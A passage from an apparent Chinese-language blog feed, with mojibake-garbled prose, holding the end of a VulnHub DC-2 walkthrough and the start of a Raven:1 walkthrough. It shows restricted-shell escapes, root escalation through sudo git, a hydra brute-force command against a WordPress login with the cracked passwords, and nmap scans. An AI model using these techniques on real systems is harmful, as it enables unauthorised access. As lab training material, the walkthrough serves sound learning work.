çš„ä¸€ç§ï¼ˆrbashã€kshã€rshç­‰ï¼‰</p></blockquote><p><strong>æ–¹æ³•ä¸€ï¼šé€šè¿‡ vi æå‡ Shell æƒé™</strong>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> vi</span><br><span class="hljs-meta">#</span><span class="bash"> è¿›å…¥åº•è¡Œæ¨¡å¼</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">set</span> shell=/bin/sh</span><br><span class="hljs-meta">#</span><span class="bash"> shell</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin/</span><br><br>tom@DC-2:~$ vi<br><span class="hljs-meta">#</span><span class="bash"> :<span class="hljs-built_in">set</span> shell=/bin/bash    å›è½¦</span><br><span class="hljs-meta">#</span><span class="bash"> :shell    å›è½¦</span><br><br>tom@DC-2:~$ export PATH=$PATH:/bin/<br>tom@DC-2:~$ cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒï¼šé€šè¿‡ BASH_CMDS æå‡ Shell æƒé™</strong>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> BASH_CMDS[a]=/bin/sh;a</span><br><span class="hljs-meta">#</span><span class="bash"> /bin/bash</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin/</span><br><br>tom@DC-2:~$ cat flag3.txt<br>-rbash: cat: command not found<br>tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a<br><span class="hljs-meta">$</span><span class="bash"> /bin/bash</span><br>tom@DC-2:~$ cat flag3.txt<br>bash: cat: command not found<br>tom@DC-2:~$ export PATH=$PATH:/bin/<br>tom@DC-2:~$ cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br></code></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºï¼Œåœ¨ <code>/home/jerry</code> ä¸‹æ‰¾åˆ° flag4ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ ls /home/jerry<br>flag4.txt<br>tom@DC-2:~$ cat /home/jerry/flag4.txt<br>Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. <br>You still need to get the final flag (the only flag that really counts!!!).  <br>No hints here - you&#x27;re on your own now.  :-)<br>Go on - git outta here!!!!<br></code></pre></td></tr></table></figure><h3 id="2ã€git-ææƒ"><a href="#2ã€git-ææƒ" class="headerlink" title="2ã€git ææƒ"></a>2ã€git ææƒ</h3><blockquote><p><a href="https://gtfobins.github.io/">GTFOBins</a></p></blockquote><p>å°½ç®¡å¯¹ tom çš„ shell è¿›è¡Œäº†ç»•è¿‡ï¼Œä½†æœ‰äº›å‘½ä»¤è¿˜æ˜¯æ²¡æœ‰ï¼ŒåŠ ä¸Šæç¤ºä¸­å‡ºç° Jerryï¼Œå°è¯•åˆ‡æ¢åˆ° Jerry ç”¨æˆ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ su jerry<br>Password: <br>jerry@DC-2:/home/tom$ id<br>uid=1002(jerry) gid=1002(jerry) groups=1002(jerry)<br>jerry@DC-2:/home/tom$ sudo -l<br>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git<br>jerry@DC-2:/home/tom$ <br><br></code></pre></td></tr></table></figure><p>å‰é¢æœ‰æç¤º git ï¼ŒåŠ ä¸Šå¯ä»¥ä½¿ç”¨ sudo ä»¥ root è¿è¡Œ  git ï¼Œä½¿ç”¨ git è¿›è¡Œææƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">jerry@DC-2:/home/tom$ sudo git -p help config<br>NAME<br>       git-config - Get and set repository or global options<br>......<br><br>!/bin/sh<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">#</span><span class="bash"> </span><br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> ls /root</span><br>final-flag.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /root/final-flag.txt</span><br> __    __     _ _       _                    _ <br>/ / /\ \ \___| | |   __| | ___  _ __   ___  / \<br>\ \/  \/ / _ \ | |  / _` |/ _ \| &#x27;_ \ / _ \/  /<br> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ <br>  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   <br><br><br>Congratulatons!!!<br><br>A special thanks to all those who sent me tweets<br>and provided me with feedback - it&#x27;s all greatly<br>appreciated.<br><br>If you enjoyed this CTF, send me a tweet via @DCAU7.<br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>1ã€WordPress</p><p>2ã€wpscanï¼šæšä¸¾ç”¨æˆ·åã€çˆ†ç ´</p><p>3ã€cewlï¼šæ ¹æ®ç«™ç‚¹ç”Ÿæˆå¯†ç å­—å…¸</p><p>4ã€SSH</p><p>5ã€å—é™ Shell çš„ç»•è¿‡ï¼Œshell ææƒ</p><p>6ã€git ææƒ</p><h2 id="äº”ã€å…¶ä»–"><a href="#äº”ã€å…¶ä»–" class="headerlink" title="äº”ã€å…¶ä»–"></a>äº”ã€å…¶ä»–</h2><p><strong>ä½¿ç”¨ hydra è¿›è¡Œçˆ†ç ´ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -L user.txt -P passwd.txt dc-2 http-form-post <span class="hljs-string">&#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log&amp;testcookie=1:S=LOcation&#x27;</span></span><br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 714 login tries (l:3/p:238), ~45 tries per task<br>[DATA] attacking http-post-form://dc-2:80/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log&amp;testcookie=1:S=LOcation<br>[80][http-post-form] host: dc-2   login: jerry   password: adipiscing<br>[80][http-post-form] host: dc-2   login: tom   password: parturient<br>1 of 1 target successfully completed, 2 valid passwords found<br></code></pre></td></tr></table></figure><p>è¡¨å•ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--http://dc-2/wp-admin ===&gt; http://dc-2/wp-login.php--&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginform&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginform&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dc-2/wp-login.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;user_login&quot;</span>&gt;</span>Username or Email Address<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;log&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user_login&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;login_error&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;20&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;user_pass&quot;</span>&gt;</span>Password<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pwd&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user_pass&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;login_error&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;20&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;forgetmenot&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;rememberme&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rememberme&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;rememberme&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;forever&quot;</span>  /&gt;</span> Remember Me<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wp-submit&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;wp-submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button button-primary button-large&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Log In&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;redirect_to&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;http://dc-2/wp-admin/&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;testcookie&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç›®å½•ä¿¡æ¯ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ ls -alhR /home<br>/home:<br>total 16K<br>drwxr-xr-x  4 root  root  4.0K Mar 21  2019 .<br>drwxr-xr-x 21 root  root  4.0K Mar 10  2019 ..<br>drwxr-xr-x  2 jerry jerry 4.0K Mar 21  2019 jerry<br>drwxr-x---  3 tom   tom   4.0K Jun 26 19:30 tom<br><br>/home/jerry:<br>total 28K<br>drwxr-xr-x 2 jerry jerry 4.0K Mar 21  2019 .<br>drwxr-xr-x 4 root  root  4.0K Mar 21  2019 ..<br>-rw------- 1 jerry jerry  333 Jun 26 20:30 .bash_history<br>-rw-r--r-- 1 jerry jerry  220 Mar 21  2019 .bash_logout<br>-rw-r--r-- 1 jerry jerry 3.5K Mar 21  2019 .bashrc<br>-rw-r--r-- 1 jerry jerry  223 Mar 21  2019 flag4.txt<br>-rw-r--r-- 1 jerry jerry  675 Mar 21  2019 .profile<br><br>/home/tom:<br>total 40K<br>drwxr-x--- 3 tom  tom  4.0K Jun 26 19:30 .<br>drwxr-xr-x 4 root root 4.0K Mar 21  2019 ..<br>-rwxr-x--- 1 tom  tom  1022 Jun 27 12:31 .bash_history<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_login<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_logout<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_profile<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bashrc<br>-rwxr-x--- 1 tom  tom    95 Mar 21  2019 flag3.txt<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .profile<br>drwxr-x--- 3 tom  tom  4.0K Mar 21  2019 usr<br><br>/home/tom/usr:<br>total 12K<br>drwxr-x--- 3 tom tom 4.0K Mar 21  2019 .<br>drwxr-x--- 3 tom tom 4.0K Jun 26 19:30 ..<br>drwxr-x--- 2 tom tom 4.0K Mar 21  2019 bin<br><br>/home/tom/usr/bin:<br>total 8.0K<br>drwxr-x--- 2 tom tom 4.0K Mar 21  2019 .<br>drwxr-x--- 3 tom tom 4.0K Mar 21  2019 ..<br>lrwxrwxrwx 1 tom tom   13 Mar 21  2019 less -&gt; /usr/bin/less<br>lrwxrwxrwx 1 tom tom    7 Mar 21  2019 ls -&gt; /bin/ls<br>lrwxrwxrwx 1 tom tom   12 Mar 21  2019 scp -&gt; /usr/bin/scp<br>lrwxrwxrwx 1 tom tom   11 Mar 21  2019 vi -&gt; /usr/bin/vi<br>You have new mail in /var/mail/tom<br></code></pre></td></tr></table></figure><p><strong>ç»• rbashï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ cat flag3.txt<br>-rbash: cat: command not found<br><br>tom@DC-2:~$ export -p<br>declare -x HOME=&quot;/home/tom&quot;<br>declare -x LANG=&quot;en_US.UTF-8&quot;<br>declare -x LOGNAME=&quot;tom&quot;<br>declare -x MAIL=&quot;/var/mail/tom&quot;<br>declare -x OLDPWD<br>declare -rx PATH=&quot;/home/tom/usr/bin&quot;<br>declare -x PWD=&quot;/home/tom&quot;<br>declare -rx SHELL=&quot;/bin/rbash&quot;<br>declare -x SHLVL=&quot;1&quot;<br>declare -x SSH_CLIENT=&quot;192.168.135.141 52502 7744&quot;<br>declare -x SSH_CONNECTION=&quot;192.168.135.141 52502 192.168.135.148 7744&quot;<br>declare -x SSH_TTY=&quot;/dev/pts/0&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;tom&quot;<br><br>tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a<br><span class="hljs-meta">$</span><span class="bash"> /bin/bash</span><br>tom@DC-2:~$ cat flag3.txt<br>bash: cat: command not found<br>tom@DC-2:~$ /bin/cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br><br>tom@DC-2:~$ export -p<br>declare -x HOME=&quot;/home/tom&quot;<br>declare -x LANG=&quot;en_US.UTF-8&quot;<br>declare -x LOGNAME=&quot;tom&quot;<br>declare -x MAIL=&quot;/var/mail/tom&quot;<br>declare -x OLDPWD<br>declare -x PATH=&quot;/home/tom/usr/bin&quot;<br>declare -x PWD=&quot;/home/tom&quot;<br>declare -x SHELL=&quot;/bin/rbash&quot;<br>declare -x SHLVL=&quot;2&quot;<br>declare -x SSH_CLIENT=&quot;192.168.135.141 52502 7744&quot;<br>declare -x SSH_CONNECTION=&quot;192.168.135.141 52502 192.168.135.148 7744&quot;<br>declare -x SSH_TTY=&quot;/dev/pts/0&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;tom&quot;<br><br>tom@DC-2:~$ export PATH=$PATH:/bin/<br>tom@DC-2:~$ export -p<br>declare -x HOME=&quot;/home/tom&quot;<br>declare -x LANG=&quot;en_US.UTF-8&quot;<br>declare -x LOGNAME=&quot;tom&quot;<br>declare -x MAIL=&quot;/var/mail/tom&quot;<br>declare -x OLDPWD<br>declare -x PATH=&quot;/home/tom/usr/bin:/bin/&quot;<br>declare -x PWD=&quot;/home/tom&quot;<br>declare -x SHELL=&quot;/bin/rbash&quot;<br>declare -x SHLVL=&quot;2&quot;<br>declare -x SSH_CLIENT=&quot;192.168.135.141 52502 7744&quot;<br>declare -x SSH_CONNECTION=&quot;192.168.135.141 52502 192.168.135.148 7744&quot;<br>declare -x SSH_TTY=&quot;/dev/pts/0&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;tom&quot;<br>declare -x VIM=&quot;/usr/share/vim&quot;<br>declare -x VIMRUNTIME=&quot;/usr/share/vim/vim74&quot;<br><br>tom@DC-2:~$ cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ravenï¼š1</title>
    <link href="/2022/06/27/Penetration/Vulnhub/Part-1/0x0A%20Raven-1/"/>
    <url>/2022/06/27/Penetration/Vulnhub/Part-1/0x0A%20Raven-1/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0A-Raven-1-vulnhub"><a href="#0x0A-Raven-1-vulnhub" class="headerlink" title="0x0A Raven: 1~vulnhub"></a>0x0A Raven: 1~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/raven-1,256/">Raven: 1 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.149</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span>  <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-27 05:23 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.0030s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.0010s latency).<br>Nmap scan report for 192.168.135.149<br>Host is up (0.00048s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.89 seconds<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.149</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>ç®€å•çš„ç«¯å£æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.149</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-27 05:26 EDT<br>Nmap scan report for 192.168.135.149<br>Host is up (0.0016s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>37354/tcp open  unknown<br>MAC Address: 00:0C:29:DE:6D:0E (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 4.03 seconds<br></code></pre></td></tr></table></figure><p><strong>å…¨é¢æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.149</span>      <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-27 05:26 EDT<br>Nmap scan report for 192.168.135.149<br>Host is up (0.00028s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)<br>|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)<br>|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)<br>|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)<br>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-server-header: Apache/2.4.10 (Debian)<br>|_http-title: Raven Security<br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          37354/tcp   status<br>|   100024  1          42390/udp6  status<br>|   100024  1          47848/udp   status<br>|_  100024  1          56818/tcp6  status<br>37354/tcp open  status  1 (RPC #100024)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 16.78 seconds<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.10 ((Debian))</td></tr><tr><td>111/tcp</td><td>open</td><td>rpcbind</td><td>rpcbind 2-4</td></tr><tr><td>37354/tcp</td><td>open</td><td>status</td><td>1 (RPC #100024)</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>80ç«¯å£</strong></p><p>è¿›è¡Œç›®å½•çˆ†ç 